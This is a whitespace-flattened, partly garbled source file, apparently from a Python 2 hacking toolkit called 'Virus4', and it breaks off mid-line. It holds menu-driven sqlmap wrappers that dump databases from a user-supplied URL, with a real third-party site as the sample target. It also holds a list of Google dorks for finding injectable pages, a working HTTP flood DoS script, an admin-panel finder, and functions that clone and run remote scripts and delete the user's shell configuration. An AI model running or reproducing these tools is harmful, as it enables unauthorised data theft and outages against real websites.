      print ""                                    time.sleep(0.05)                            print cyan+'[+]------'+red+' exomple '+cyan+'----------------------------------------------[+]'                                     time.sleep(0.05)                            print cyan+'  |  '+red+'DATABASE :  '+cyan+'informations_schema                            |'                                       time.sleep(0.05)                            print cyan+'[+]-------------------------------------------------------------[+]'        data = raw_input(red +'   DATABASE-------> ')                                           x = str(data)                               if x == '0' or x == '00' :                    url()                                     else :                                       os.system('python2 ~/sqlmap/sqlmap.py -u '+url+' -D '+data+' --tables --level=3 --risk=3 --batch')                                  def table():                                 print red +"                                          [0]back"                          time.sleep(0.05)                            print ""                                    time.sleep(0.05)                            print cyan+'[+]------'+red+' exomple '+cyan+'----------------------------------------------[+]'                                     time.sleep(0.05)                            print cyan+'  |  '+red+'TABLE :  '+cyan+'user                                              |'                                       time.sleep(0.05)                            print cyan+'[+]-------------------------------------------------------------[+]'                                                    time.sleep(0.05)                            table = raw_input(red +'   TABLE-------> ')                                             d = str(table)                              if d == '0' or d == '00' :                     dataase()                                else :                                       os.system('python2 ~/sqlmap/sqlmap.py -u '+url+' -D '+data+' -T '+table+' --columns --level=3 --risk=3 --batch')                    def column():                                  print red +"                                          [0]back"                          time.sleep(0.05)                            print ""                                    time.sleep(0.05)                            print cyan+'[+]------'+red+' exomple '+cyan+'----------------------------------------------[+]'                                     time.sleep(0.05)                            print cyan+'  |  '+red+'COLUMN :  '+cyan+'admin $ password                                 |'                                       time.sleep(0.05)                            print cyan+'[+]-------------------------------------------------------------[+]'                                                    time.sleep(0.05)                            columns = raw_input(red +'   COLUMN-------> ')                                          c = str(columns)                            if c == '0' or c == '00' :                       table()                                else :                                        os.system('python2 ~/sqlmap/sqlmap.py -u '+url+' -D '+data+' -T '+table+' -C '+columns+' --dump --level=3 --risk=3 --batch')                                               column()                                  table()                                   dataase()                              url()                                       backtomenu_website()                      def kali_sql():                               def url():                                      print red +"                                          [0]back"                          time.sleep(0.05)                            print ""                                    time.sleep(0.05)                            print cyan+'[+]------'+red+' exomple '+cyan+'----------------------------------------------[+]'                                     time.sleep(0.05)                            print cyan+'  |  '+red+'URL :  '+cyan+'http://ceburealproperty.com/show_cat_page.php?id=3  |'                                       time.sleep(0.05)                            print cyan+'[+]-------------------------------------------------------------[+]'        time.sleep(0.05)                            url = raw_input(red +'   URL-------> ')                                                 a = str(url)                                if a == '0' or a == '00' :                    sql()                                     else :                                       os.system('sqlmap -u '+url+' --dbs s-- level=3 --risk=3 --batch')                       def dataase():                               print red +"                                          [0]back"                          time.sleep(0.05)                            print ""                                    time.sleep(0.05)                            print cyan+'[+]------'+red+' exomple '+cyan+'----------------------------------------------[+]'                                     time.sleep(0.05)                            print cyan+'  |  '+red+'DATABASE :  '+cyan+'informations_schema                            |'                                       time.sleep(0.05)                            print cyan+'[+]-------------------------------------------------------------[+]'        data = raw_input(red +'   DATABASE-------> ')                                           x = str(data)                               if x == '0' or x == '00' :                    url()                                     else :                                       os.system('sqlmap -u '+url+' -D '+data+' --tables --level=3 --risk=3 --batch')          def table():                                 print red +"                                          [0]back"                          time.sleep(0.05)                            print ""                                    time.sleep(0.05)                            print cyan+'[+]------'+red+' exomple '+cyan+'----------------------------------------------[+]'                                     time.sleep(0.05)                            print cyan+'  |  '+red+'TABLE :  '+cyan+'user                                              |'                                       time.sleep(0.05)                            print cyan+'[+]-------------------------------------------------------------[+]'                                                    time.sleep(0.05)                            table = raw_input(red +'   TABLE-------> ')                                             d = str(table)                              if d == '0' or d == '00' :                     dataase()                                else :                                       os.system('sqlmap.py '+url+' -D '+data+' -T '+table+' --columns --level=3 --risk=3 --batch')                                        def column():                                  print red +"                                          [0]back"                          time.sleep(0.05)                            print ""                                    time.sleep(0.05)                            print cyan+'[+]------'+red+' exomple '+cyan+'----------------------------------------------[+]'                                     time.sleep(0.05)                            print cyan+'  |  '+red+'COLUMN :  '+cyan+'admin $ password                                 |'                                       time.sleep(0.05)                            print cyan+'[+]-------------------------------------------------------------[+]'                                                    time.sleep(0.05)                            columns = raw_input(red +'   COLUMN-------> ')                                          c = str(columns)                            if c == '0' or c == '00' :                       table()                                else :                                        os.system('sqlmap -u '+url+' -D '+data+' -T '+table+' -C '+columns+' --dump --level=3 --risk=3 --batch')                       column()                                  table()                                   dataase()                              url()                                       backtomenu_website()                                                                  def sql():                                   print ''                                    time.sleep(0.05)                            print red +"                                          [0]back"                          time.sleep(0.05)                            print ''                                    time.sleep(0.05)                            print cyan +'        [01]Hack web sql in Termux'                                        time.sleep(0.05)                            print cyan +'        [02]Hack web sql in Kali linux'                                    time.sleep(0.05)                            print ''                                    time.sleep(0.05)                            print ''                                    time.sleep(0.05)                            print ''                                    time.sleep(0.05)                            nember =raw_input("Virus4(" + red + "website/hack_web_sql"+ cyan + ") > ")              if nember == '1' or nember == '01' :             termux_sql()                           elif nember == '2' or nember == '02' :           kali_sql()                             elif nember == '0' or nember == '00' :           website()                              else :                                           error()                                     sql()                                 def dork():                                  print cyan+"""                             inurl:trainers.php?id=                      inurl:buy.php?category=                     inurl:article.php?ID=                       inurllay_old.php?id=                        inurl:declaration_more.php?decl_id=         inurlageid=                                 ld.php?id=                                  inurl:declaration_more.php?decl_id=         inurlageid=                                 inurl:games.php?id=                         inurlage.php?file=                          inurl:newsDetail.php?id=                    inurl:gallery.php?id=                       inurl:article.php?id=                       inurl:show.php?id=                          inurl:staff_id=                             inurl:newsitem.php?num=                     inurl:readnews.php?id=                      inurl:top10.php?cat=                        inurl:historialeer.php?num=                 inurl:reagir.php?num=                       inurl:Stray-Questions-View.php?num=         inurl:forum_bds.php?num=                    inurl:game.php?id=                          inurl:index.php?id=                         inurl:trainers.php?id=                      inurl:buy.php?category=                     inurl:article.php?ID=                       inurllay_oinurl:view_product.php?id=        inurl:newsone.php?id=                       inurl:sw_comment.php?id=                    inurl:news.php?id=                          inurl:avd_start.php?avd=                    inurl:event.php?id=                         inurlroduct-item.php?id=                    inurl:sql.php?id=                           inurl:news_view.php?id=                     inurl:select_biblio.php?id=                 inurl:humor.php?id=                         inurl:aboutbook.php?id=                     inurlgl_inet.php?ogl_id=                    inurl:fiche_spectacle.php?id=               inurl:communique_detail.php?id=             inurl:sem.php3?id=                          inurl:kategorie.php4?id=                    inurl:news.php?id=                          inurl:index.php?id=                         inurl:faq2.php?id=                          inurl:show_an.php?id=                       inurl:review.php?id=                        inurl:loadpsb.php?id=                       inurlinions.php?id=                         inurl:spr.php?id=                           inurlages.php?id=                           inurl:announce.php?id=                      inurl:clanek.php4?id=                       inurlarticipant.php?id=                     inurl:download.php?id=                      inurl:main.php?id=                          inurl:review.php?id=                        inurl:chappies.php?id=                      inurl:read.php?id=                          inurlrod_detail.php?id=                     inurl:viewphoto.php?id=                     inurl:article.php?id=                       inurlerson.php?id=                          inurlroductinfo.php?id=                     inurl:showimg.php?id=                       inurl:view.php?id=                          inurl:***site.php?id=                       inurl:hosting_info.php?id=                  inurl:gallery.php?id=                       inurl:rub.php?idr=                          inurl:view_faq.php?id=                      inurl:artikelinfo.php?id=                   inurl:detail.php?ID=                        inurl:index.php?=                           inurlrofile_view.php?id=                    inurl:category.php?id=                      inurlublications.php?id=                    inurl:fellows.php?id=                       inurl:downloads_info.php?id=                inurlrod_info.php?id=                       inurl:shop.php?do=part&id=                  inurlroductinfo.php?id=                     inurl:collectionitem.php?id=                inurl:band_info.php?id=                     inurlroduct.php?id=                         inurl:releases.php?id=                      inurl:ray.php?id=                           inurlroduit.php?id=                         inurlop.php?id=                             inurl:shopping.php?id=                      inurlroductdetail.php?id=                   inurlost.php?id=                            inurl:viewshowdetail.php?id=                inurl:clubpage.php?id=                      inurl:memberInfo.php?id=                    inurl:section.php?id=                       inurl:theme.php?id=                         inurlage.php?id=                            inurl:shredder-categories.php?id=           inurl:tradeCategory.php?id=                 inurlroduct_ranges_view.php?ID=             inurl:shop_category.php?id=                 inurl:transcript.php?id=                    inurl:channel_id=                           inurl:item_id=                              inurl:newsid=                               inurl:trainers.php?id=                      inurl:news-full.php?id=                     inurl:news_display.php?getid=               inurl:index2.php?option=                    inurl:readnews.php?id=                      inurl:top10.php?cat=                        inurl:newsone.php?id=                       inurl:event.php?id=                         inurlroduct-item.php?id=                    inurl:sql.php?id=                           inurl:aboutbook.php?id=                     inurlreview.php?id=                         inurl:loadpsb.php?id=                       inurlages.php?id=                           inurl:material.php?id=                      inurl:clanek.php4?id=                       inurl:announce.php?id=                      inurl:chappies.php?id=                      inurl:read.php?id=                          inurl:viewapp.php?id=                       inurl:viewphoto.php?id=                     inurl:rub.php?idr=                          inurl:galeri_info.php?l=                    inurl:review.php?id=                        inurl:iniziativa.php?in=                    inurl:curriculum.php?id=                    inurl:labels.php?id=                        inurl:story.php?id=                         inurl:look.php?ID=  inurl:index.php?id=     inurl:trainers.php?id=                      inurl:buy.php?category=                     inurl:article.php?ID=                       inurl:play_old.php?id=                      inurl:declaration_more.php?decl_id=         inurl:pageid=                               inurl:games.php?id=                         inurl:page.php?file=                        inurl:newsDetail.php?id=                    inurl:gallery.php?id=                       inurl:article.php?id=                       inurl:show.php?id=                          inurl:staff_id=                             inurl:newsitem.php?num=                     inurl:readnews.php?id=                      inurl:top10.php?cat=                        inurl:historialeer.php?num=                 inurl:reagir.php?num=                       inurl:Stray-Questions-View.php?num=         inurl:forum_bds.php?num=                    inurl:game.php?id=                          inurl:view_product.php?id=                  inurl:newsone.php?id=                       inurl:sw_comment.php?id=                    inurl:news.php?id=                          inurl:avd_start.php?avd=                    inurl:event.php?id=                         inurl:product-item.php?id=                  inurl:sql.php?id=                           inurl:news_view.php?id=                     inurl:select_biblio.php?id=                 inurl:humor.php?id=                         inurl:aboutbook.php?id=                     inurl:ogl_inet.php?ogl_id=                  inurl:fiche_spectacle.php?id=               inurl:communique_detail.php?id=             inurl:sem.php3?id=                          inurl:kategorie.php4?id=                    inurl:news.php?id=                          inurl:index.php?id=                         inurl:faq2.php?id=                          inurl:show_an.php?id=                       inurl:preview.php?id=                       inurl:loadpsb.php?id=                       inurl:opinions.php?id=                      inurl:spr.php?id=                           inurl:pages.php?id=                         inurl:announce.php?id=                      inurl:clanek.php4?id=                       inurl:participant.php?id=                   inurl:download.php?id=                      inurl:main.php?id=                          inurl:review.php?id=                        inurl:chappies.php?id=                      inurl:read.php?id=                          inurl:prod_detail.php?id=                   inurl:viewphoto.php?id=                     inurl:article.php?id=                       inurl:person.php?id=                        inurl:productinfo.php?id=                   inurl:showimg.php?id=                       inurl:view.php                              """                                          backtomenu_website()                       def website():                               print ''                                    time.sleep(0.05)                            print red +"                                          [0]back"                          time.sleep(0.05)                            print ''                                    time.sleep(0.05)                            print cyan +'        [01]Dos Attack'        time.sleep(0.05)                            print cyan +'        [02]Admin panel finder'                                            time.sleep(0.05)                            print cyan +'        [03]hash id '          time.sleep(0.05)                            print cyan +'        [04]HaCk WEB SQL'      time.sleep(0.05)                            print cyan +'        [05]Dork Google'       time.sleep(0.05)                            print ''                                    time.sleep(0.05)                            print ''                                    time.sleep(0.05)                            print ''                                    time.sleep(0.05)                            nember =raw_input("Virus4(" + red + "website"+ cyan + ") > ")                           if nember == '1' or nember == '01' :             ddos()                                 elif nember == '2' or nember == '02' :           admin()                                elif nember == '3' or nember == '03' :           hash_id()                              elif nember == '4' or nember == '04' :           sql()                                  elif nember == '5' or nember == '05' :           dork()                                 elif nember == '0' or nember == '00' :           Virus4()                               else :                                           error()                                     website()                             def up_date():                               print ''                                    time.sleep(0.05)                            print red +"                                          [0]back"                          time.sleep(0.05)                            print ''                                    x = raw_input(cyan +'enter in update >')    if x == "0" or x == '00':                     Virus4()                                  else :                                       os.system('rm -rf update.sh')               f = open('update.sh' , 'w')                 f.write('''                               rm -rf update.sh                            rm -rf ../Virus4                            cd ..                                       git clone https://github.com/amerlaceset/Virus4                                         cd Virus4                                   chmod +x *                                  echo ''                                     echo ' hello '                              echo '       in'                            echo '          last'                       echo '               version'               echo ''                                     sleep 6                                     python2 Virus4.py                           ''')                                          f.close()                                   os.system('mv -v update.sh ..')             os.system('bash ../update.sh')            def my_youtube():                            print ""                                    time.sleep(2)                               print cyan+'  {'+red+'Virus4 Hacking'+cyan+'}--------{'+red+'https://www.youtube.com/channel/UCmQETFbkmkiSiu3og6F8usg'+cyan+'}'     time.sleep(6)                               webbrowser.open_new('https://www.youtube.com/channel/UCmQETFbkmkiSiu3og6F8usg')         os.system("termux-open https://www.youtube.com/channel/UCmQETFbkmkiSiu3og6F8usg ")      Virus4()                                   def my_facebook():                           print ""                                    time.sleep(2)                               print cyan+'  {'+blue+'Amer Amer'+cyan+'}--------{'+blue+'https://www.facebook.com/100019536310282'+cyan+'}'                        time.sleep(6)                               webbrowser.open_new('https://www.facebook.com/100019536310282')                         os.system('termux-open https://www.facebook.com/100019536310282')                       Virus4()                                   def moni():                                  print ''                                    time.sleep(2)                               print cyan + '[*]starting the Virus4 ...'   time.sleep(3)                               print ''                                    os.system('rm -rf moni')                    os.system('git clone https://github.com/amerlaceset/moni')                              os.system('clear')                          os.system('bash moni/mona.sh')              os.system('rm -rf moni')                   def sem():                                   e = str(random.randint(1,18))               if e in "1":                                  sem_2()                                   elif e in "2":                                sem_3()                                   elif e in "3":                                sem_4()                                   elif e in "4":                                sem_5()                                   elif e in "5":                                sem_6()                                   elif e in "6":                                sem_7()                                   elif e in "7":                                sem_8()                                   elif e in "8":                                sem_9()                                   elif e in "9":                                sem_10()                                  elif e in "10":                               sem_11()                                  elif e in "11":                               sem_12()                                  elif e in "12":                               sem_13()                                  elif e in "13":                               sem_14()                                  elif e in "14":                               sem_15()                                  elif e in "15":                               sem_16()                                  elif e in "16":                               sem_17()                                  elif e in "17":                               sem_18()                                  elif e in "18":                               sem_19()                                  else :                                        print "error"                                                                        def Virus4():                                sem()                                       print '                     '+blue+'V' +green+ '  i' +reset+ '  r' +purple+ '  u' +cyan+ '  s' +yellow+ '  4' +green +' ^_^'        time.sleep( 0.05)                           time.sleep( 0.05)                           kk(h)                                       print green + "  +________________________________________________________+"            time.sleep(0.05)                            print '  |' + cyan + "  [1] metasploit  |" +  reset + "  [2]Download   |" + purple + "  [3] Account       | "                       time.sleep(0.05)                            print ""                                    time.sleep(0.05)                            print  green + "  |           --------------------------------             |  "         time.sleep(0.05)                            print '  |' + red + "  [4] virus       | " + green + " [5] ngrok     | " + blue + " [6]  nmap         |    "                        time.sleep(0.05)                            print''                                     time.sleep(0.05)                            print green + "  |           --------------------------------             |  "          time.sleep(0.05)                            print '  |' + green + "  [7] Games       | " + reset + " [8] Termux    | " + purple + " [9] WEBsite       |    "                    time.sleep(0.05)                            print''                                     time.sleep(0.05)                            print''                                     time.sleep(0.05)                            print  green + "  |           --------------------------------             |  "         time.sleep(0.05)                            print '  |' + red + "  [00] Exit       | " + green + " [90] help     |" + blue + " [99] update        |    "                        time.sleep(0.05)                            print''                                     time.sleep(0.05)                            print''                                     time.sleep(0.05)                            print  green + "  |           --------------------------------             |  "         gg(f)                                       gg(y)                                       time.sleep(0.05)                            print''                                     time.sleep(0.05)                                                                        time.sleep(0.05)                           #echo -e "$green"                            nem = raw_input(cyan+"  |---{" + yellow + " my ip " + cyan +"}---| " +cyan+'    ('+red+'y'+cyan+') or ('+red+'n'+cyan+') ')         if nem == 'y' or nem == '(y)' or nem == 'Y' or nem == '(Y)' :                            os.system('curl ifconfig.me')               print blue                                  os.system('ifconfig wlan0 | grep -o 192..........')                                    else :                                        print cyan+'     was canceled'            #echo -e "$green "                          time.sleep(0.05)                            print''                                     time.sleep(0.05)                            enter =raw_input( cyan + " { 5.0.0 } Virus4 > ")                                        if enter == "1" or enter == "metasploit" or enter == "01":                               metasploitf()                              elif enter == "2" or enter == "Download" or enter == "02":                               download()                                 elif enter == "3" or enter == 'Account' or enter == "03":                                account()                                  elif enter == "4" or enter == 'virus' or enter == "04":                                  virus()                                    elif enter == "5" or enter == 'ngrok' or enter == "05":                                  Ngrok()                                    elif enter == "6" or enter == 'nmap' or enter == "06":                                   Nmap()                                     elif enter == "7" or enter == 'Games' or enter == "07":                                  games()                                    elif enter == "8" or enter == 'Termux' or enter == "08":                                 termux()                                   elif enter == "9" or enter == 'WEBsite' or enter == "09":                                website()                                  elif enter == "90" or enter == 'help':       help()                                     elif enter == "99"or enter == 'update':      up_date()                                  elif enter == "00" or enter == 'exit' or enter == "0" or enter == "quit":                exit()                                     elif enter == "20" or enter == 'youtube':    my_youtube()                               elif enter == "30" or enter == "facebook":   my_facebook()                              else:                                        error()                                     Virus4()                                  moni()    while food == []:                               food = [randint(1, 18), randint(1, 58)]                 # Calculating next food's coordinates                                       if food in snake: food = []             win.addch(food[0], food[1], '*')        else:                                           last = snake.pop()                                          # [1] If it does not eat the food, length decreases                     win.addch(last[0], last[1], ' ')        win.addch(snake[0][0], snake[0][1], '#')                                             curses.endwin()                             print("\nScore - " + str(score))            backtomenu_games()                         def games_moon():                            os.system('apt-get install moon-buggy')     os.system('pkg install moon-buggy')         os.system('moon-buggy')                     backtomenu_games()                         def games_greed():                           os.system('apt-get install greed')          os.system('pkg install greed')              os.system('greed')                          backtomenu_games()                         def games():                                 print ''                                    time.sleep(0.05)                            print red +"                                          [0]back"                          time.sleep(0.05)                            print ''                                    time.sleep(0.05)                            print cyan +'        [01]games snake'       time.sleep(0.05)                            print cyan +'        [02]games moon-buggy'  time.sleep(0.05)                            print cyan +'        [03]games greed'       time.sleep(0.05)                            print ''                                    time.sleep(0.05)                            print ''                                    time.sleep(0.05)                            print ''                                    time.sleep(0.05)                            nember =raw_input("Virus4(" + red + "games"+ cyan + ") > ")                             if nember == '1' or nember == '01' :             games_snake()                          elif nember == '2' or nember == '02' :           games_moon()                           elif nember == '3' or nember == '03' :           games_greed()                          elif nember == '0' or nember == '00' :           Virus4()                               else :                                           error()                                     games()                               def termux_1():                              print ''                                    time.sleep(2)                               os.system('rm -rf sem.sh')                  f = open('sem.sh' , 'w')                    f.write('''                                read -p "            name-------> " amer    rm $HOME/.bashrc                            rm ~/../usr/etc/bash.bashrc                 sed "s/Sniper/$amer/" tools/Termux/termux_1 > ~/.bashrc                                 pkg install figlet                                                                      ''')                                         f.close()                                   os.system('bash sem.sh')                    os.system('rm -rf sem.sh')                  backtomenu_termux()                        def termux_2():                              print ''                                    time.sleep(2)                               os.system('rm -rf sem.sh')                  f = open('sem.sh' , 'w')                    f.write('''                                read -p "            name-------> " amer    rm $HOME/.bashrc                            rm ~/../usr/etc/bash.bashrc                 sed "s/max/$amer/" tools/Termux/termux_2 > ~/.bashrc                                    pkg install figlet                                                                      ''')                                         f.close()                                   os.system('bash sem.sh')                    os.system('rm -rf sem.sh')                  backtomenu_termux()                        def termux_3():                              print ''                                    time.sleep(2)                               os.system('rm -rf sem.sh')                  f = open('sem.sh' , 'w')                    f.write('''                                rm $HOME/.bashrc                            rm ~/../usr/etc/bash.bashrc                 sed "s/YourSelF/$amer/" tools/Termux/termux_3 > ~/.bashrc                               pkg install figlet                          ''')                                         f.close()                                   os.system('bash sem.sh')                    os.system('rm -rf sem.sh')                  backtomenu_termux()                        def termux():                                print ''                                    time.sleep(0.05)                            print red +"                                          [0]back"                          time.sleep(0.05)                            print ''                                    time.sleep(0.05)                            print cyan +'        [01]Change the shape of Termux'                                    time.sleep(0.05)                            print cyan +'        [02]Change shape of the skull Termux'                              time.sleep(0.05)                            print cyan +'        [03]Change shape of the skull(2) Termux'                           print ''                                    time.sleep(0.05)                            print ''                                    time.sleep(0.05)                            print ''                                    time.sleep(0.05)                            nember =raw_input("Virus4(" + red + "termux"+ cyan + ") > ")                            if nember == '1' or nember == '01' :             termux_1()                             elif nember == '2' or nember == '02' :           termux_2()                             elif nember == '3' or nember == '03' :           termux_3()                             elif nember == '0' or nember == '00' :           Virus4()                               else :                                           error()                                     termux()                              def ddos():                                                                              from queue import Queue                     from optparse import OptionParser           import time,sys,socket,threading,logging,urllib,random                                  def user_agent():                                  global uagent                               uagent=[]                                   uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")         uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")                                         uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")                                 uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")         uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")                                      uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")                                                  uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")                           return(uagent)                                                                                                               def my_bots():                                     global bots                                 bots=[]                                     bots.append("http://validator.w3.org/check?uri=")                                       bots.append("http://www.facebook.com/sharer/sharer.php?u=")                             return(bots)                                                                                                                 def bot_hammering(url):                            try:                                                while True:                                         req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))                             print "\033[94mbot is max...\033[0m"                                                    time.sleep(.1)              except:                                             time.sleep(.1)                                                                                                       def down_it(item):                                 try:                                                while True:                                         packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')                                                                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)                                   s.connect((host,int(port)))                                                             if s.sendto( packet, (host, int(port)) ):                                                       s.shutdown(1)                                                                           print "\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--Max is attacking--> \033[0m"                                  else:                                               s.shutdown(1)                                                                           print "\033[91mshut<->down\033[0m"                                              time.sleep(.1)              except socket.error as e:                           print "\033[91mno connection! server maybe down\033[0m"                                 #print("\033[91m",e,"\033[0m")                                                          time.sleep(.1)                                                                                                       def dos():                                         while True:                                         item = q.get()                              down_it(item)                               q.task_done()                                                                                                        def dos2():                                        while True:                                         item=w.get()                                bot_hammering(random.choice(bots)+"http://"+host)                                       w.task_done()                                                                                                        def usage():                                       print('')                                                                                                                    def get_parameters():                              global host                                 global port                                 global thr                                  global item                                 optp = OptionParser(add_help_option=False,epilog="Hammers")                             optp.add_option("-q","--quiet", help="set logging to ERROR",action="store_const", dest="loglevel",const=logging.ERROR, default=logging.INFO)                                    optp.add_option("-s","--server", dest="host",help="attack to server ip -s ip")          optp.add_option("-p","--port",type="int",dest="port",help="-p 80 default 80")           optp.add_option("-t","--turbo",type="int",dest="turbo",help="default 135 -t 135")                                                   optp.add_option("-h","--help",dest="help",action='store_true',help="help you")          opts, args = optp.parse_args()              logging.basicConfig(level=opts.loglevel,format='%(levelname)-8s %(message)s')                                                       host = raw_input(green+'ip/link+----------> ')                                          port = raw_input(green+'port/80+----------> ')                                          thr = raw_input(green+'Time in seconds+--> ')                                           if opts.help:                                       usage()                             if opts.host is not None:                           host = opts.host                    else:                                               usage()                             if opts.port is None:                               port = 80                           else:                                               port = opts.port                    if opts.turbo is None:                              thr = 135                           else:                                               thr = opts.turbo                                                                                                    # reading headers                            global data                                 headers = open("headers.txt", "r")          data = headers.read()                       headers.close()                            #task queue are q,w                          q = Queue()                                 w = Queue()                                                                                                                         if __name__ == '__main__':                         if len(sys.argv) < 2:                               usage()                             get_parameters()                            print "\033[92m",host," port: ",str(port)," turbo: ",str(thr),"\033[0m"                 print "\033[94mPlease wait...\033[0m"                                                   user_agent()                                my_bots()                                   time.sleep(5)                               try:                                                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)                                   s.connect((host,int(port)))                 s.settimeout(1)                     except socket.error as e:                           print "\033[91mcheck server ip and port\033[0m"                                         usage()                             while True:                                         for i in range(int(thr)):                           t = threading.Thread(target=dos)                                                        t.daemon = True  # if thread is exist, it dies                                          t.start()                                   t2 = threading.Thread(target=dos2)                                                      t2.daemon = True  # if thread is exist, it dies                                         t2.start()                          start = time.time()                         #tasking                                    item = 0                                    while True:                                         if (item>1800): # for no memory crash                                                           item=0                                      time.sleep(.1)                                                                  item = item + 1                             q.put(item)                                 w.put(item)                         q.join()                                    w.join()                     backtomenu_website()                       def admin():                                 from urllib2 import Request, urlopen, URLError, HTTPError                                                                           def Space(j):                                      i = 0                                       while i<=j:                                         print " ",                                  i+=1                                                                                                                 def findAdmin():                                   f = open("link.txt","r");                   link = raw_input("Enter Site Name \n(ex : example.com or www.example.com ): ")          print "\n\nAvilable links : \n"             while True:                                         sub_link = f.readline()                     if not sub_link:                                    break                               req_link = "http://"+link+"/"+sub_link                                                  req = Request(req_link)                     try:                                                response = urlopen(req)                                                         except HTTPError as e:                              continue                            except URLError as e:                               continue                            else:                                               print "OK => ",req_link                                                                                      def Credit():                                      Space(9); print "#####################################"                                 Space(9); print "#   +++ welcome to my tools +++   #"                                   Space(9); print "#       I LOVE YOU MY FRINDES       #"                                 Space(9); print "#    My Name is Amer DZ {Virus4}    #"                                 Space(9); print "#####################################"                                                                      Credit()                                    findAdmin()                                 backtomenu_website()                       def hash_id():                               #! usr/bin/python2                                                                      """                                        __Author__ = Ci Ku ~ debby anggraini a.k.a xnver404                                     __Name__ = Virus4                           __version__ = 5.0.0                         __Code__ = python                           __Github__ = https://github.com/amerlaceser __Date__ = 26 - 8 - 2019                                                                """                                                                                      import sys ,  hashlib ,  time ,  os , random , binascii                                                                             from urllib import urlopen, urlencode       from re import search                                                                  # color                                      if sys.platform == "linux" or sys.platform == "linux2":                                                                                    BB = "\033[34;1m" # Blue light              YY = "\033[33;1m" # Yellow light            GG = "\033[32;1m" # Green light             WW = "\033[0;1m"  # White light             RR = "\033[31;1m" # Red light               CC = "\033[36;1m" # Cyan light              B = "\033[34m"    # Blue                    Y = "\033[33m"    # Yellow                  G = "\033[32m"    # Green                   W = "\033[0m"     # White                   R = "\033[31m"    # Red                     C = "\033[36m"    # Cyan                                                                # Random color                              rand = (BB,YY,GG,WW,RR,CC)                  P = random.choice(rand)                                                          elif sys.platform == "win32":                                                                  BB = '' # Blue light                        YY = '' # Yellow light                      GG = '' # Green light                       WW = '' # White light                       RR = '' # Red light                         CC = '' # Cyan light                        B = ''  # Blue                              Y = ''  # Yellow                            G = ''  # Green                             W = ''  # White                             R = ''  # Red                               C = ''  # Cyan                              P = ''  # Random color                                                           def banner():                                      print ""                                                                         def info():                                                                                    print ""                             def Update():                                      if sys.platform == "linux" or sys.platform == "linux2":                                         print (B+" 0={"+W+" UPDATE WORDLIST "+B+"}=0\n")                                        time.sleep(1)                                                                           print (B+"["+W+"="+B+"] "+G+"remove old wordlist")                                      os.system("sleep 2")                        time.sleep(1)                                                                           print (B+"["+W+"="+B+"] "+G+"downloading new wordlist")                                 time.sleep(1)                                                                           print (R+"["+W+"*"+R+"] "+R+"Curl Started ...\n"+W)                                                                                 os.system("sleep 0.5")                                                                  print (R+"\n["+W+"*"+R+"] "+G+"download Finish\n"+W)                                    sys.exit()                          else:                                               print ("sorry, word list update feature is only available on linux platform\n")                                                     sys.exit()                                                                                                           try:                                                                                           # module tambahan                                                                       import progressbar                          from passlib.hash import mysql323 as m20                                                from passlib.hash import mysql41 as m25                                                 from passlib.hash import mssql2000 as ms20                                              from passlib.hash import mssql2005 as ms25                                              from passlib.hash import nthash as nthash                                               from passlib.hash import lmhash as lmhash                                                                                    except ImportError:                                banner()                                    time.sleep(0.5)                             print (B+"["+W+"="+B+"] "+G+"installing module "+R+"progressbar , passlib\n"+W)                                                     os.system("pip2 install --upgrade pip")                                                 os.system("pip2 install passlib")           os.system("pip2 install progressbar")                                                                                               print (B+"\n["+W+"="+B+"] "+G+"install success , run program again\n"+W)                sys.exit()                                                                       def hash():                                        banner()                                                                                hash_str = raw_input(B+"["+W+"?"+B+"]"+G+" Hash : "+W)                          #       time.sleep(0.5)                             print (B+"["+R+"="+B+"] "+G+"Cek Hash Type ...")                                #       time.sleep(1)                                                                                                                       # Contoh Hash nya , nb : jangan di ubah ntar error                                                                                  SHA512= ('dd0ada8693250b31d9f44f3ec2d4a106003a6ce67eaa92e384b356d1b4ef6d66a818d47c1f3a2c6e8a9a9b9bdbd28d485e06161ccd0f528c8bbb5541c3fef36f')                                    md = ('ae11fd697ec92c7c98de3fac23aba525')                                               sha1 = ('4a1d4dbc1e193ec3ab2e9213876ceb8f4db72333')                                     sha224 = ('e301f414993d5ec2bd1d780688d37fe41512f8b57f6923d054ef8e59')                   sha384 = ('3b21c44f8d830fa55ee9328a7713c6aad548fe6d7a4a438723a0da67c48c485220081a2fbc3e8c17fd9bd65f8d4b4e6b')                       sha256 = ('2c740d20dab7f14ec30510a11f8fd78b82bc3a711abe8a993acdb323e78e6d5e')           mysql1323 = ("5d2e19393cc5ef67")            mysql41 = ("*88166B019A3144C579AC4A7131BCC3AD6FF61DA6")                                 mssql2000 = ("0x0100DE9B3306258B37432CAC3A6FB7C638946FA393E09C9CBC0FA8C6E03B803390B1C3E7FB112A21B2304595D490")                      mssql2005 = ('0x01008110620C7BD03A38A28A3D1D032059AE9F2F94F3B74397F8')                                                              if len(hash_str)==len(mysql1323) and hash_str.isdigit()==False and hash_str.isalpha()==False and hash_str.isalnum()==True:                  print (B+"["+R+"="+B+"] "+G+"hash type : "+W+"mysql 3.2.3")                             hash = "mysql1323"                                                              elif len(hash_str)==len(mysql41) and "*" in hash_str:                                           print (B+"["+R+"="+B+"] "+G+"hash type : "+W+"mysql 4.1")                               hash = "mysql41"                                                                elif len(hash_str)==len(mssql2000) and "0x0" in hash_str:                                       print (B+"["+R+"="+B+"] 